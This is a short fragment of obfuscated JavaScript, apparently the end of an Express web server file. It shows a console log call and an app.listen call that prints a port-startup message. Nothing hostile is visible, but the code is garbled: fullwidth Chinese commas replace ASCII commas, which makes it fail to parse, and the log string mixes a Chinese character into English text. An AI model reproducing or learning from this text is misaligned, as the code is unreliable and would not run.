_0x1d54b8=_0x49ef8d;console[_0x1d54b8(0xd2)](_0x1d54b8(0x11a)，_0x307a13);})，app[_0x49ef8d(0xfe)](PORT，()=>console[_0x49ef8d(0x7f)]('http\x20server\x20is\x20running\x20于\x20port:'+PORT+'!'));
